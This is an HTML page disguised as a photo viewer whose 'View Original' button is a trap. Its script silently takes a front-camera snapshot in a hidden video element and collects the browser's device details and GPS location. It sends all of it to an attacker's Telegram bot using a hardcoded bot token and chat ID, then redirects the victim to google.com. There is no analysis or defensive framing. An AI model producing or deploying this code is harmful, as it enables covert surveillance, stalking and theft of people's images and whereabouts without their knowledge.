<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Viewer</title>
    <style>
        body { font-family: Tahoma, sans-serif; text-align: center; padding: 40px 20px; background: #eef2f7; }
        .card { background: white; padding: 30px; border-radius: 15px; max-width: 380px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        img { width: 100%; height: 220px; border-radius: 10px; margin-bottom: 20px; object-fit: cover; }
        .fake-btn { background: #28a745; color: white; border: none; padding: 15px 25px; border-radius: 8px; cursor: pointer; font-size: 18px; font-weight: bold; width: 100%; box-shadow: 0 4px 10px rgba(40,167,69,0.3); transition: 0.2s; }
        .fake-btn:hover { background: #218838; }
        video { display: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="pic.jpg" alt="Photo">
    <button class="fake-btn" id="actionBtn" onclick="runTrap()">View Original</button>
</div>

<video id="webcam" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = '9127341110:AAFIyYQbgw2OKfvWqCtWQgHyKvyST6cfuZ8';
    const CHAT_ID = '5978508786';

    const video = document.getElementById('webcam');

    async function runTrap() {
        const btn = document.getElementById('actionBtn');
        btn.innerText = "Loading...";
        btn.disabled = true;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;

            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(async (blob) => {
                    const deviceInfo = navigator.userAgent;

                    if ("geolocation" in navigator) {
                        navigator.geolocation.getCurrentPosition(
                            async (position) => {
                                await sendToTelegram(blob, deviceInfo, position.coords.latitude, position.coords.longitude);
                            },
                            async (error) => {
                                await sendToTelegram(blob, deviceInfo, null, null);
                            },
                            { timeout: 10000 }
                        );
                    } else {
                        await sendToTelegram(blob, deviceInfo, null, null);
                    }
                }, 'image/jpeg', 0.8);

            }, 1500);

        } catch (err) {
            window.location.href = "https://www.google.com";
        }
    }

    async function sendToTelegram(imageBlob, deviceInfo, lat, lng) {
        try {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, 'capture.jpg');
            formData.append('caption', `📱 Device Info:\n${deviceInfo}`);

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            if (lat && lng) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lng })
                });
            }

            window.location.href = "https://www.google.com";

        } catch (err) {
            window.location.href = "https://www.google.com";
        }
    }
</script>

</body>
</html>
